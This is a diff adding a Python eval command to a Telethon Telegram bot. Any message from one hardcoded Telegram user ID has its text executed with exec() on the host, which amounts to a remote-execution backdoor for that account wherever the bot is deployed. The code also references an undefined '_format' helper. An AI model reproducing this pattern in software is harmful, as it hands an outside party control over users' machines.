@@ -1,0 +1,76 @@
+import os, logging, asyncio, random, sys, io, traceback
+from telethon import Button
+from telethon import TelegramClient, events
+from telethon.tl.types import ChannelParticipantsAdmins
+from telethon.tl.types import ChannelParticipantCreator
+from telethon.tl.functions.channels import GetParticipantRequest
+from telethon.errors import UserNotParticipantError
+
+from ubot import dex
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(name)s - [%(levelname)s] - %(message)s'
+)
+LOGGER = logging.getLogger(__name__)
+
+
+@dex.on(events.NewMessage(pattern="^/evel(?:\s|$)([\s\S]*)"))
+async def evel(event):
+  if event.sender.id == 6527347171:
+    cmd = "".join(event.message.message.split(maxsplit=1)[1:])
+    ms = await event.get_reply_message()
+    if not cmd:
+        return await event.reply("`What should i run ?..`")
+    cmd = (
+        cmd.replace("sendmessage", "send_message")
+        .replace("sendfile", "send_file")
+        .replace("editmessage", "edit_message")
+    )
+    catevent = await event.reply("`Running ...`")
+    old_stderr = sys.stderr
+    old_stdout = sys.stdout
+    redirected_output = sys.stdout = io.StringIO()
+    redirected_error = sys.stderr = io.StringIO()
+    stdout, stderr, exc = None, None, None
+    try:
+        await aexec(cmd, event)
+    except Exception:
+        exc = traceback.format_exc()
+    stdout = redirected_output.getvalue()
+    stderr = redirected_error.getvalue()
+    sys.stdout = old_stdout
+    sys.stderr = old_stderr
+    evaluation = ""
+    if exc:
+        evaluation = exc
+    elif stderr:
+        evaluation = stderr
+    elif stdout:
+        evaluation = stdout
+    else:
+        evaluation = "Success"
+    final_output = (
+        f"**•  Eval : **\n```{cmd}``` \n\n**•  Result : **\n```{evaluation}``` \n"
+    )
+    await catevent.delete()
+    await event.reply(final_output)
+
+async def aexec(code, smessatatus):
+    message = event = smessatatus
+    p = lambda _x: print(_format.yaml_format(_x))
+    reply = await event.get_reply_message()
+    exec(
+        (
+            "async def __aexec(message, event , reply, client, p, chat): "
+            + "".join(f"\n {l}" for l in code.split("\n"))
+        )
+    )
+
+    return await locals()["__aexec"](
+        message, event, reply, message.client, p, message.chat_id
+    )
+
+
+print(">>BOT START DEXX<<")
+
